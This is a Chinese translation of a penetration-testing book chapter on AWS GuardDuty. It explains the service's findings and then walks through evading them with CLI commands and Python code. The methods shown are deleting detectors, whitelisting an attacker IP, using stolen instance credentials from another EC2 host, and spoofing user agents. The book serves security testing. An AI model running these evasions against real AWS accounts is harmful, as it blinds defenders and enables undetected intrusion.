# 第十六章：GuardDuty

作为攻击者，了解目标环境中进行了哪种类型的监视是很重要的，因为它可以并将塑造整个攻击计划。如果我知道某种类型的监视已启用以在发生 XYZ 时触发警报，那么我就不会执行 XYZ，因为我知道我会被抓住。相反，我会选择另一条更有可能不被察觉的路线。如果我知道环境中没有监视，那么我可以采取最简单或最快的路径来实现我的目标，而不必担心触发某些操作的警报。

**亚马逊网络服务**（**AWS**）提供各种安全服务，但主要的安全监控服务是**GuardDuty**。需要注意的是，即使在禁用 GuardDuty 的环境中，这并不意味着没有任何监视。这是因为有许多工具，包括 AWS 内部和第三方工具，提供监视选项。本章将介绍 AWS 监视服务 GuardDuty，这是一个廉价的内部解决方案，用于在环境中捕捉低 hanging fruit。

在本章中，我们将涵盖以下主题：

+   GuardDuty 及其发现简介

+   关于 GuardDuty 发现的警报和反应

+   绕过 GuardDuty

# GuardDuty 及其发现简介

GuardDuty 是 AWS 提供的持续监控服务，可识别并警告账户内的可疑或不需要的行为。目前，它分析三种数据源，即**虚拟私有云**（**VPC**）流日志，CloudTrail 事件日志和**域名系统**（**DNS**）日志。请注意，VPC 流日志和 CloudTrail 事件日志不需要在您的账户上启用 GuardDuty 才能使用它们，目前无法在 AWS 中查看 DNS 日志。这意味着即使环境中没有活动的流日志，并且 CloudTrail 被禁用，GuardDuty 仍将从 VPC 流日志，CloudTrail 事件日志和 DNS 日志生成发现。

还需要注意的是，GuardDuty 只能摄取 DNS 日志，如果请求通过 AWS DNS 解析器路由，则 EC2 实例的默认设置。如果更改了这一设置，并且请求使用其他 DNS 解析器，例如 Google 或 CloudFlare，则 GuardDuty 无法摄取和警报该 DNS 数据。

GuardDuty 也可以进行跨账户管理，其中单个主账户控制一个或多个成员账户的 GuardDuty 监视和配置。如果您发现自己在组织的 GuardDuty 主账户中，您可能能够操纵与其连接的每个账户的监视配置。

有关跨账户 GuardDuty 配置的更多信息，请访问 AWS 文档：[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_accounts.html`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_accounts.html)。

GuardDuty 会针对各种不同的项目生成发现。有关最新列表，请访问[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html)以查看生成的活动发现集。

在高层次上，GuardDuty 基本上会警告您可能类似恶意行为的事件，例如如果 EC2 实例正在与已知的恶意软件命令和控制服务器通信，EC2 实例正在与已知的比特币挖矿池通信，或者正在使用已知的黑客操作系统。然后可以设置这些警报以发送通知到`CloudWatch`事件，然后您可以对发现做出反应：

![](img/88b2176a-6be5-406d-ad42-0b5cf081201b.png)

AWS Web 控制台中报告的账户中的 GuardDuty 发现示例列表

大多数 GuardDuty 发现类型依赖于机器学习来建立用户在账户中的正常活动基线。如果某事超出了基线并匹配了该发现类型，它将发出警报。考虑一个拥有两个 IAM 用户和启用了 GuardDuty 的 AWS 账户的例子。其中一个用户经常使用 IAM 服务来管理用户、组和角色，并管理所有这些的权限。另一个用户只使用 EC2 服务，尽管他们有权限做更多的事情。如果这两个用户都尝试枚举 IAM 用户、组或角色的权限，GuardDuty 可能不会触发 IAM 用户，因为这是该用户与 IAM 服务互动的基线。另一方面，EC2 用户可能会生成`Recon:IAMUser/UserPermissions` GuardDuty 发现类型，这表明用户试图枚举账户中的权限（并且这打破了为他们建立的基线）。

有许多 GuardDuty 发现类型非常简单，旨在捕捉攻击者的低挂果。这些类型的发现通常很简单或明显，以至于您不应该触发它们，即使您没有直接考虑它们。其中一些发现包括对 EC2 实例进行端口扫描，对**安全外壳**（**SSH**）/**远程桌面协议**（**RDP**）服务器进行暴力破解，或者使用 Tor 与 AWS 进行通信。在本章中，我们将重点关注更具 AWS 特色的发现和更高级的发现，因为简单的发现类型不一定在本书的范围内，而且它们应该很容易被规避或避免。

另一个需要考虑的重要事项是 GuardDuty 如何使用机器学习和基线来确定是否应该触发发现。如果您处于一个沙盒环境中，因为您正在测试工具和攻击方法，所以不断受到攻击，那么 GuardDuty 可能会将这种活动检测为您账户的基线。如果是这种情况，那么它可能不会触发您期望的某些发现，因为它已经将这种类型的活动在环境中视为正常。

# 关于 GuardDuty 发现的警报和反应

默认情况下，GuardDuty 将生成发现并在 Web 控制台上提供。还可以设置一个 CloudWatch Events 规则来对这些发现做出反应。通过 AWS Web 控制台进行此操作，我们可以导航到 CloudWatch Events 规则页面并创建一个新规则。对于这个规则，我们将选择 GuardDuty 作为要匹配的服务，然后选择 GuardDuty Finding 作为要匹配的事件类型。然后，我们将选择某种目标来发送发现信息。目标可以是各种各样的东西，比如**简单通知服务**（**SNS**）主题，然后将发现的数据发送给安全团队的文本或电子邮件，或者可能是 Lambda 函数，然后根据发现类型做出反应，尝试自动修复它。

![](img/7d67e3d8-1d75-4177-9bc4-269b47379648.png)

创建一个新的 CloudWatch Events 规则，将其定位到一个 Lambda 函数

这张截图显示了一个 CloudWatch Events 规则被创建，以便在 GuardDuty 发现时触发，并在触发时定位到`ExampleFunction` Lambda 函数。这种规则允许您自动化警报和/或防御 GuardDuty 触发的发现。

例如，一个 Lambda 函数可能会解析`CloudWatch` Events 发送的数据，确定触发了什么类型的发现，然后根据此做出反应。例如，如果 GuardDuty 发出警报，EC2 实例正在连接到已知的与加密货币相关的域，Lambda 函数可能会自动阻止该域的出站互联网访问，该域位于 EC2 实例所在的安全组中。您还可以向`CloudWatch` Events 规则添加另一个目标，该规则使用 SNS 向您的安全团队发送短信。这样，如果检测到与加密货币相关的活动，Lambda 函数将自动阻止，并且安全团队将收到警报，然后他们可以决定应该采取什么步骤来适当地再次保护环境。

# 绕过 GuardDuty

GuardDuty 触发的发现有很多，因此有很多方法可以绕过这些检测，以便您不会被抓住。并非所有事情都可以被绕过，但作为攻击者，您至少应该了解 GuardDuty 正在寻找什么，以便在攻击环境时积极努力避免或绕过它。有可能您的活动只会触发一个 GuardDuty 警报，就会关闭您对账户的访问权限，但也有可能没有人真正关注警报的到来，所以在那种情况下您就不需要太担心。

如果您想真的变得更加先进，您还可以故意触发某些 GuardDuty 警报，以便在您悄悄在环境中做其他事情的同时，让任何倾听的防御者陷入困境。此外，如果您知道目标账户正在使用`CloudWatch` Events 来触发 GuardDuty 发现，您甚至可以使用`CloudWatch` Events `PutEvents` API 提供完全虚假的 GuardDuty 发现，这可能会破坏`CloudWatch` Events 规则的目标，因为它包含意外的数据。此外，您还可以以正确的格式发送数据，但只是带有错误的信息，这可能会让防御者和/或他们的自动化在尝试修复发现时感到困惑。

# 用强制绕过一切

我们将要看的第一个绕过方法实际上并不是一个绕过方法，但它将阻止 GuardDuty 对我们的警报。这包括在账户中禁用 GuardDuty 探测器的监控或完全删除它们。您可能不应该使用这种方法，因为它具有破坏性，并且可能对您正在攻击的环境产生重大影响，但知道这是一个选择是很好的。请记住，这个例子只针对单个区域，但可能需要在每个区域运行这些命令，因为 GuardDuty 必须基于每个区域启用。

我们可以使用`ListDetectors`命令识别现有的 GuardDuty 探测器，例如以下内容：

```
 aws guardduty list-detectors 
```

如果我们在当前区域找到一个，我们可以通过运行以下命令来禁用它：

```
aws guardduty update-detector --detector-id <ID of the detector we found> --no-enable 
```

现在我们当前区域的探测器将不再监视和报告任何发现。

我们甚至可以进一步删除探测器，而不是禁用它。我们可以使用以下命令来做到这一点：

```
aws guardduty delete-detector --detector-id <ID of the detector we found> 
```

现在它不存在了，就没有办法监视我们了。

# 用 IP 白名单绕过一切

绕过 GuardDuty 的最佳和最有效的方法就是将您自己的攻击者 IP 地址添加到目标账户的受信任 IP 地址列表中。这是一个简单的过程，GuardDuty 不会触发任何与 GuardDuty 设置的枚举或修改有关的内容，因此它很可能会在更现代、先进的环境中悄悄进行，甚至不会引起注意。如果我们在 AWS 网络控制台的 Lists 选项卡中查看 GuardDuty，我们将看到类似以下截图的内容：

![](img/5cc880c9-d125-4dd2-bda0-897a23429f0a.png)

在 AWS 网络控制台中显示 GuardDuty 的受信任 IP 列表和威胁列表

在这个截图中，我们可以看到有一个受信任的 IP 列表和威胁列表的部分。它们分别是白名单和黑名单 IP 地址的一种方式，告诉 GuardDuty 要么忽略这些 IP 地址的发现（白名单），要么对这些 IP 地址的一切触发警报（黑名单）。

作为攻击者，这太棒了。我们可以在不触发任何警报的情况下将我们自己的 IP 地址列入白名单，然后在环境中肆无忌惮，而不用担心从那时起 GuardDuty。

当您尝试将自己添加为受信任的 IP 时，可能会遇到一个问题，即 GuardDuty 允许每个区域最多一个受信任的 IP 列表。这意味着如果我们的目标已经使用受信任的 IP 列表，我们将不得不稍微修改我们的攻击。首先要做的是确定他们是否实际上使用了受信任的 IP 列表。请注意，GuardDuty 基于每个区域进行监视，因此可能需要针对每个可用区域中的每个 GuardDuty 检测器重复这些步骤。我们可以通过运行以下 AWS 命令行界面（CLI）命令来做到这一点：

```
   aws guardduty list-detectors 
```

这应该返回当前区域的 GuardDuty 检测器的 ID。在我们的示例中，结果是`e2b19kks31n78f00931ma8b081642901`。如果没有返回检测器 ID，那意味着 GuardDuty 在当前区域未启用，如果您试图绕过它，这是个好消息！然后我们将检查这个检测器，看看它是否已经有一个与之关联的受信任 IP 列表，使用以下命令：

```
 aws guardduty list-ip-sets --detector-id e2b19kks31n78f00931ma8b081642901 
```

如果已经有一个受信任的 IP 集合，它的 ID 将被返回，如果没有，将返回一个空列表。我们将首先看一下的情况假设他们还没有使用受信任的 IP 列表。这对我们来说是最理想的情况。

要开始这次攻击，我们需要在我们的计算机上创建一个文本文件，其中包含我们想要列入白名单的 IP 地址。我们将把这个文件命名为`ip-whitelist.txt`。然后，因为 GuardDuty 要求包含 IP 白名单的文件必须托管在 S3 中，我们将把这个文件上传到我们自己攻击账户中的一个 S3 存储桶，并公开暴露这个文件。这样做的原因是我们始终控制着所使用的白名单，甚至在参与过程中可能需要修改它。在这个示例中，我们将说我们使用`bucket-for-gd-whitelist` S3 存储桶。首先，我们将使用以下命令将我们的文件上传到存储桶中：

```
 aws s3 cp ./ip-whitelist.txt s3://bucket-for-gd-whitelist
```

接下来，我们将确保我们的文件是公开可读的，这样 GuardDuty 在设置为白名单时可以随时读取它。我们可以使用以下命令来做到这一点：

```
aws s3api put-object-acl --acl public-read --bucket bucket-for-gd-whitelist --key ip-whitelist.txt 
```

请记住，存储桶本身或您的帐户的设置可能会阻止公共对象，因此如果在运行此命令时收到访问被拒绝的消息，或者似乎无法工作，请确保存储桶或帐户的公共访问设置已正确配置以允许公共对象。

现在我们的文件应该可以在此 URL 公开访问（仅供本示例使用）：[`s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt`](https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt)。

接下来，我们将使用以下命令为我们之前确定的 GuardDuty 检测器创建新的受信任 IP 列表：

```
 aws guardduty create-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --format TXT --location https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt --name Whitelist --activate
```

如果这一步成功，你应该会收到一个包含新创建的受信任 IP 集合 ID 的响应。现在就是这样。你的 IP 地址已经在当前区域的 GuardDuty 的受信任 IP 列表中，这意味着 GuardDuty 不会为它生成发现（从 GuardDuty 列表页面）。

正如你可能已经猜到的，Pacu 有一个模块可以自动化这个过程。从 Pacu，我们可以使用`guardduty__whitelist_ip`模块在每个区域执行此操作。我们可以使用以下命令来做到这一点：

```
 run guardduty__whitelist_ip --path https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt
```

完成后，Pacu 将在每个 AWS 区域中将您的 IP 地址列入 GuardDuty 的白名单。

现在我们将看一个场景，目标 AWS 账户已经设置了 GuardDuty 的信任 IP 列表。我们不能只是添加另一个列表，因为每个 GuardDuty 检测器最多只能有一个信任的 IP 列表。我们可以用几种不同的方式来处理这个问题。在运行`ListIPSets`命令并看到确实设置了信任的 IP 列表之后，我们可以直接删除现有的 IP 集，然后实施一个将我们自己的 IP 列入白名单的 IP 集。如果您使用 Pacu，并且 Pacu 检测到已经存在的信任 IP 集，它将提示您删除它并创建您自己的 IP 集，或者跳过该检测器。唯一的问题是，删除现有的信任 IP 白名单可能会在环境中产生意想不到的后果，这意味着在试图保持隐蔽时，我们可能会引起比必要更多的注意。

我们还有另一个选择，即将当前的信任 IP 列表更新为包括我们自己的 IP，以及原来存在的所有 IP。为了做到这一点，让我们从`ListIPSets` API 调用中收集到的 IP 集 ID，并运行`GetIPSet`命令：

```
 aws guardduty get-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --ip-set-id 37w2992c2274llq7u4121o8af11j4971 
```

如果我们在本节早些时候创建的信任 IP 列表上运行该命令，输出将如下所示：

```
{
    "Format": "TXT",
    "Location": "https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt",
    "Name": "Whitelist",
    "Status": "ACTIVE"
}
```

我们将把这个信任的 IP 列表视为我们以前没有见过的列表（尽管我们自己设置了它）。我们需要做的是访问 URL 并下载当前的列表，然后修改列表以包括我们自己的攻击者 IP 地址。完成后，我们将按照之前的过程，将这个文件上传到我们自己的个人 S3 存储桶，并使文件公开可读。

完成后，我们将使用`UpdateIPSet` API 而不是之前使用的`CreateIPSet` API。我们可以使用以下命令更新现有的信任 IP 列表为我们的新列表：

```
 aws guardduty update-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --ip-set-id 37w2992c2274llq7u4121o8af11j4971 --location https://s3.amazonaws.com/our-own-bucket-for-gd-whitelist/our-own-ip-whitelist.txt --activate
```

现在，我们已经用我们自己的 IP 地址更新了信任的 IP 列表，而不会删除任何已经列入白名单的 IP，因此不会在环境中引起任何骚动，可能会引起注意。

作为一个负责任的（聪明的）攻击者，我们还需要跟进一步。这一步是在 AWS 的参与/渗透测试/攻击的最后，我们恢复原始的白名单，这样在查看时配置看起来不会很奇怪，我们的 IP 也不再存储在他们可以访问的列表中。为了做到这一点，我们应该保存最初与信任的 IP 列表相关联的 URL，直到参与结束，然后再次使用`UpdateIPSet` API 将其恢复到该 URL。通过这样做，我们的 IP 在参与期间被 GuardDuty 列入白名单，然后在完成后离开环境，而不对其中的资源进行任何重大修改。

重要的一点是，如果您攻击的账户有另一个外部主账户控制的 GuardDuty，您将无法修改信任的 IP 列表设置。只有主账户在管理 GuardDuty 跨账户时才能做到这一点。当主账户上传信任的 IP 列表时，这个列表将被应用到属于该主账户的所有 GuardDuty 成员身上，这对于已经攻破了 GuardDuty 主账户的攻击者来说是很棒的。

# 绕过 EC2 实例凭据外泄警报

本节将重点关注单个 GuardDuty 发现类型：`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`。AWS 文档描述了当专门为 EC2 实例通过实例启动角色创建的凭据从外部 IP 地址使用时，将触发此发现（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11)）。基本上，当启动 EC2 实例并附加 IAM 实例配置文件时，GuardDuty 期望该角色的凭据只能在该单个实例中使用，或者至少是这样的，但我们很快就会讨论这个问题。

这个发现之所以在本章中有自己的部分，是因为在 AWS 的参与中，出现了有可能触发它的情况非常普遍。我们在渗透测试中发现的获取这些凭据的最常见方法是在具有 IAM 实例配置文件的 EC2 实例上获得服务器端请求伪造。然后，您可以向 EC2 元数据 URL（[`169.254.169.254/`](http://169.254.169.254/)）发出 HTTP 请求并请求这些凭据。在这种情况下，您无法在服务器上执行命令，因此需要将获取的凭据外泄以使用它们。这就是 GuardDuty 发现介入并识别 EC2 实例凭据来自外部 IP 地址的地方。

尽管这个 GuardDuty 发现是在攻击环境中遇到的最常见的之一，但它也是最容易完全绕过的之一。需要注意的重要事情是，当文档说，“*正在使用* *外部 IP 地址时，”它指的是一个对所有 EC2 都是外部的 IP 地址，并不是指 EC2 实例附加的 IAM 实例配置文件外部的 IP 地址。

鉴于这些信息，绕过很简单。我们只需要在我们自己的攻击者帐户中启动一个 EC2 实例（如果我们知道的话，可以在与我们 SSRF 的服务器相同的区域中启动，以便源 IP 在区域范围内），使用 AWS CLI，Pacu 等配置凭据，然后开始入侵。对于 Pacu，您只需要运行`set_keys`命令，并输入从目标 EC2 实例窃取的访问密钥 ID，秘密访问密钥和会话令牌，然后您就可以运行任何模块或 API 命令，而不必担心 GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`警报。

要在我们自己的帐户中启动此 EC2 实例，运行 Ubuntu Server 18.04 LTS，我们可以运行以下命令，然后用您在 AWS EC2 中创建的 SSH 密钥的名称替换`<your ec2 ssh key name>`（您需要修改镜像 ID 和区域参数值以在`us-east-1`以外的区域运行此命令）：

```
 aws ec2 run-instances --region us-east-1 --image-id ami-0ac019f4fcb7cb7e6 --instance-type t2.micro --key-name <your ec2 ssh key name> --count 1 --user-data file://userdata.txt
```

`userdata.txt`文件应包含以下内容，将安装`Python3`，`Pip3`，`Git`，AWS CLI 和`Pacu`：

```
#!/bin/bash
apt-get update
apt-get install python3 python3-pip git -y
pip3 install awscli
cd /root
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu/
/bin/bash install.sh
```

启动实例后，您可以使用在命令行中提供的 SSH 密钥进行 SSH 连接。然后，我们可以运行以下命令：

+   `sudo su`

+   `cd /root/pacu`

+   运行`python3 pacu.py`

+   `set_keys`

在这一点上，您将被提示将您的角色凭据输入 Pacu，以便您可以开始。如果在尝试更改目录到`/root/pacu`时不存在该文件夹，则可能实例仍在安装用户数据脚本中定义的各种软件。等一两分钟然后再次检查。如果仍然没有显示，请查看`/var/log/cloud-init-output.log`文件的内容，看看在安装任何前述软件期间是否有任何错误，或者它是否仍在运行。

现在，只要您留在这个实例内部，您就不需要担心 GuardDuty 发现的警报，但是如果您移动到 EC2 IP 范围之外，很可能会在您的第一个 API 调用时触发警报。

另一个重要的观点是，`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` GuardDuty 警报只针对您账户中的 EC2 实例。这意味着，如果您通过某些其他 AWS 服务托管的服务器获得了凭据，这个 GuardDuty 警报不会关注您对这些凭据的使用。这意味着，如果您在 Lambda 函数上获得了远程代码执行，并从环境变量中窃取了凭据，您可以将其转移到任何系统并使用，而不用担心被这种特定的 GuardDuty 发现类型检测到。对于 AWS Glue 开发端点也是一样；如果您从 Glue 开发端点的元数据 API 中窃取了凭据，您可以将其转移到任何地方而不用担心，因为 GuardDuty 不会追踪它们。

Glue 是一个有趣的例子，因为开发端点基本上似乎是在别人的账户中启动的 EC2 实例（由 AWS 自己拥有），当然有一些修改。这意味着从 Glue 开发端点中窃取凭据实际上可能会触发 AWS 自己拥有的 AWS 账户中的 GuardDuty 警报，但这对我们攻击者来说并不重要，因为我们的目标不会拥有这些信息。

# 绕过操作系统（渗透测试）警报

在`PenTest`发现类型的 GuardDuty 警报下有三个警报。这些发现是`PenTest:IAMUser/KaliLinux`、`PenTest:IAMUser/ParrotLinux`和`PenTest:IAMUser/PentooLinux`，当从 Kali Linux 服务器、Parrot Linux 服务器或 Pentoo Linux 服务器发出 AWS API 调用时会触发警报。只要您知道是什么导致了这些警报被检测到，就很容易绕过它们。

无论您使用什么客户端与 API 交互，无论是来自受支持的各种语言的 SDK（如 Java、Python 或 Node.js），AWS CLI（在后台使用 Python），AWS web 控制台，还是原始的 HTTP 请求，您都将始终有一个用户代理来描述您的操作系统和版本，以及在进行请求时使用的其他软件及其版本。然后，CloudTrail 会记录这个用户代理字符串，就像我们在第十五章中看到的那样，*渗透测试 CloudTrial*。

在 Kali Linux 上使用 AWS CLI 时发送的示例用户代理如下所示：

```
 aws-cli/1.16.89 Python/3.6.8 Linux/4.19.0-kali1-amd64 botocore/1.12.79 
```

这个用户代理告诉我们一些事情：

+   使用 AWS CLI，版本为 1.16.89，进行了请求。

+   AWS CLI 在后台使用 Python 版本 3.6.8。

+   操作系统是带有 4.19.0 内核版本的 Kali Linux，运行在 AMD 64 上。

+   Python 正在使用`botocore`库的 1.12.79 版本。

在 Parrot Linux 上使用 AWS CLI 时发送的示例用户代理如下所示：

```
 aws-cli/1.16.93 Python/3.6.8 Linux/4.19.0-parrot1-13t-amd64 botocore/1.12.83
```

这个用户代理告诉我们一些事情：

+   使用 AWS CLI，版本为 1.16.93，进行了请求。

+   AWS CLI 在后台使用 Python 版本 3.6.8。

+   操作系统是带有 4.19.0 内核版本的 Parrot Linux，运行在 AMD 64 上。

+   Python 正在使用`botocore`库的 1.12.83 版本。

在 Pentoo Linux 上使用 AWS CLI 时发送的示例用户代理如下所示：

```
[aws-cli/1.16.93 Python/2.7.14 Linux/4.17.11-pentoo botocore/1.12.83] 
```

这个用户代理告诉我们一些事情：

+   使用 AWS CLI，版本为 1.16.93，进行了请求。

+   AWS CLI 在后台使用 Python 版本 2.7.14。

+   操作系统是带有 4.17.11 内核版本的 Pentoo Linux。

+   Python 正在使用`botocore`库的 1.12.83 版本。

在使用 AWS web 控制台时，大多数 CloudTrail 日志将使用以下用户代理：

```
   signin.amazonaws.com 
```

这个用户代理告诉我们用户是登录到 AWS web 控制台，而不是使用其他与 API 交互的方法。

对于 Kali、Parrot 和 Pentoo Linux 用户代理，我们可以看到它们都包含各自的操作系统名称（`kali`、`parrot`、`pentoo`）。这基本上是 GuardDuty 用来识别这些操作系统使用的内容，当报告`PenTest`发现类型时。

要获得自己的用户代理，您可以对 API 进行任何 AWS 请求，该请求将被记录在 CloudTrail 中，然后您可以查看该 CloudTrail 事件的详细信息，以查看记录的用户代理是什么。如果您使用 Python 的`boto3`库与 AWS API 进行交互，您可以使用以下代码行来打印出您的用户代理是什么：

```
print(boto3.session.Session()._session.user_agent())
```

为了避免这些 GuardDuty 检查，即使我们使用 Kali Linux、Parrot Linux 或 Pentoo Linux，我们只需要在向 AWS API 发出请求之前修改我们使用的用户代理。只要 GuardDuty 在我们的用户代理中没有检测到`kali`、`parrot`或`pentoo`，那么我们就没问题。

以下代码块显示了一个小例子，我们如何检测这些操作系统中的任何一个，如何在那种情况下更改用户代理，然后如何成功地使用修改后的用户代理进行请求。这段代码遵循了我们在整本书中一直遵循的相同的 Python 3 与`boto3`模式：

```
import random

import boto3
import botocore

# A list of user agents that won't trigger GuardDuty
safe_user_agents = [
 'Boto3/1.7.48 Python/3.7.0 Windows/10 Botocore/1.10.48',
 'aws-sdk-go/1.4.22 (go1.7.4; linux; amd64)',
 'aws-cli/1.15.10 Python/2.7.9 Windows/8 botocore/1.10.10'
]

# Grab the current user agent
user_agent = boto3.session.Session()._session.user_agent().lower()

# Check if we are on Kali, Parrot, or Pentoo Linux against a lowercase version of the user agent
if 'kali' in user_agent.lower() or 'parrot' in user_agent.lower() or 'pentoo' in user_agent.lower():
 # Change the user agent to a random one from the list of safe user agents
 user_agent = random.choice(safe_user_agents)

# Prepare a botocore config object with our user agent
botocore_config = botocore.config.Config(
 user_agent=user_agent
)

# Create the boto3 client, using the botocore config we just set up
client = boto3.client(
 'ec2',
 region_name='us-east-1',
 config=botocore_config
)

# Print out the results of our EC2 DescribeInstances call
print(client.describe_instances())
```

基本上，所有这些代码所做的就是检查我们的客户端的用户代理字符串中是否包含`kali`、`parrot`或`pentoo`，如果是，就将其更改为已知的安全用户代理。这样修改我们的请求将允许我们完全规避 GuardDuty 进行的 PenTest/用户代理检查。

尽管直接使用`boto3`库很容易规避这些 GuardDuty 检查，但在使用 AWS CLI 时会有点棘手（尽管不是不可能）。您还需要将此代码添加到您正在使用的任何其他软件中，以确保在攻击期间永远不会被检测到；然而，幸运的是，Pacu 已经考虑到了这一点。

启动 Pacu（`python3 pacu.py`）时，这个检查 Kali、Parrot 和 Pentoo Linux 的操作将自动为您执行。如果 Pacu 检测到您正在运行其中任何一个操作系统，那么它将自动从本地存储的列表中选择一个已知的安全用户代理，并将使用这个新的用户代理进行 Pacu 发出的任何和所有 AWS 请求。这个检查将应用于创建的整个 Pacu 会话，因此只有在创建 Pacu 会话时才会看到更改已经进行的警告。如果您将该会话移动到另一台计算机，它将保留最初选择的用户代理，因此所有请求在 CloudTrail 中都显示为一致的。

在 Pacu 启动时，当您在我们一直在关注的三个操作系统中的一个上创建新会话时，您会看到以下消息：

![](img/42d02d1d-c7d8-48e1-aa21-2cd0dbf870a6.png)

Pacu 中的内置 GuardDuty 防御

现在，任何检查 CloudTrail 日志的人都会看到我们正在使用的是 Windows 10，而不是 Kali Linux。这意味着 GuardDuty 也会看到同样的情况，并不会对我们触发任何发现。

尽管这些发现列在`PenTest`GuardDuty 类别下，听起来并不一定恶意，但这些检查是我们可以努力规避的最重要的检查之一。这是因为使用这三个操作系统中的任何一个都会对知道它们在其环境中通常（或从未）使用的防御者看起来非常可疑，这意味着我们的攻击很可能会在短时间内被调查和停止。

在这种情况下修改我们的用户代理时，可能并不总是有意义使用一个看似随机的用户代理作为我们的替代。比如说，我们妥协了一个严格使用 AWS Java SDK 进行 API 调用的帐户，但我们妥协了一个用户并更改了我们的用户代理以反映我们使用 Python `boto3`库。这将引起任何留意这种事情的防御者的怀疑。由于用户代理由用户控制，这种类型的检测非常不可靠，所以你可能不经常遇到，但还是值得注意。

为了击败任何用户代理检测，我们可能需要审查目标帐户的 CloudTrail 日志，以找到我们已经妥协的用户之前进行的 API 调用。然后，我们可以复制该用户代理并将其用作我们自己的，一举两得。我们将隐藏我们使用 Kali、Parrot 或 Pentoo Linux 的事实，并通过使用以前见过的用户代理来适应环境的规范。

# 其他简单的规避方法

与我们之前讨论的类似，GuardDuty 检查了许多不同的事情，因此每一种可能都需要其自己的规避方法。

我们可以遵循的最简单的规则来规避`low-hanging-fruit` 检查包括以下内容：

+   不要使用 Tor 网络与 AWS 通信

+   不要从 EC2 实例扫描端口

+   不要暴力破解 SSH/RDP 服务器

+   不要与已知的恶意网络、主机或 IP 通信

还有一些其他的事情我们应该记住。

# 加密货币

如果我们想要挖掘加密货币（在合法的渗透测试期间绝对不应该这样做），我们将要查看`CryptoCurrency:EC2/BitcoinTool.B!DNS` 和`CryptoCurrency:EC2/BitcoinTool.B` GuardDuty 警报。这些警报会触发与已知与加密货币相关的活动相关的域名和 IP 地址的网络活动（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_crypto.html`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_crypto.html)）。这意味着我们可以通过避免直接连接到已知的与加密货币相关的域名和 IP 地址，如交易所和矿池，来规避这一点。

# 行为

规避 GuardDuty 行为检查也可能非常简单。

要规避`Behavior:EC2/NetworkPortUnusual` 发现，当 EC2 实例与不寻常端口上的远程主机通信时触发，我们只需要确保我们正在执行的任何恶意软件命令和控制使用常见端口，如`80`（HTTP）或`443`（HTTPS），而不是一些随机的高端口。

`Behavior:EC2/TrafficVolumeUnusual` GuardDuty 发现在向远程主机发送异常大量网络流量时触发。作为防御者，这可能表明内部网络中存在数据外泄的迹象。作为攻击者，我们可以通过限制出站带宽来规避这一发现，以便一次性发生的流量量不会很大。相反，会在较长时间内发生少量的流量。

# ResourceConsumption

`ResourceConsumption:IAMUser/ComputeResources` GuardDuty 发现在检测到旨在将计算资源（EC2）启动到帐户中的 API 时触发。我们可以通过避免在 GuardDuty 监控的区域使用`RunInstances` EC2 API 来规避这一发现类型。如果每个区域都没有被监控，我们可以在未被监控的区域启动我们的 EC2 实例；然而，如果每个区域都被监控，那么我们可以通过完全避免 API 调用或使用其他 AWS 服务来启动我们需要的服务器来规避这一点。

我们可以通过使用 AWS 内的许多服务之一来做到这一点，这些服务也会启动服务器，其中一些包括**Lightsail**实例、Glue 开发端点或**AppStream**实例。在这些情况下，我们仍然会在目标账户内启动服务器，但它们不会被 GuardDuty 检测到，因为我们已经避免了`RunInstances` EC2 API。

# 隐蔽

我们已经讨论了 GuardDuty 发现类型中与 CloudTrail 相关的两种，但在**隐蔽**类别下还有第三种：`Stealth:IAMUser/PasswordPolicyChange`。当账户的密码策略被削弱时，比如最小密码长度从 15 个字符变为 8 个字符时，就会触发这个发现。为了避免这种情况，我们简单地不应该触碰我们正在攻击的账户内的密码强度要求。

# 特洛伊木马

GuardDuty 的特洛伊木马类别中的大多数发现可以通过永远不与已知的恶意 IP 地址和域通信来避免，这很容易做到。然而，有一个发现，`Trojan:EC2/DNSDataExfiltration`，有点不同。当发现 EC2 实例通过 DNS 查询外泄数据时，就会触发这个发现。为了避免这种情况，我们可以简单地决定不在受损的 EC2 实例内使用 DNS 数据外泄的方法。

此外，正如之前讨论的，GuardDuty 只能读取使用 AWS DNS 服务器的 DNS 请求的 DNS 日志。可能可以定制你的恶意软件使用替代 DNS 解析器（而不是 AWS DNS 的 EC2 默认值）进行 DNS 外泄，这将完全绕过 GuardDuty，因为它永远不会看到这些流量。

# 其他

还有其他 GuardDuty 发现类别我们没有讨论，这是因为它们通常更难绕过，需要特定情况下的攻击，或者它们被包含在我们已经讨论过的另一个主题中。

# 总结

在当前状态下，GuardDuty 处于早期阶段，并且在环境中检测恶意活动时寻找很多低 hanging fruit。这些检查中的许多（有时甚至全部）都很容易在攻击 AWS 环境的过程中绕过和/或避免。尽管本章试图涵盖目前对 GuardDuty 的所有了解，但随着时间的推移，该服务正在慢慢更新和改进。这主要是因为其中涉及到机器学习。

由于 GuardDuty 的位置，它可能不是一个很好的应对一切的解决方案，所以当你攻击 AWS 环境时，重要的是要记住它可能不是唯一监视你的东西。即使你在攻击一个有 GuardDuty 和另一个监控工具的环境，尽量绕过 GuardDuty 仍然是有用和实际的，这样你就不会因为一些低 hanging fruit 而被抓住，或者因为环境中更先进的监控设置而被抓住。
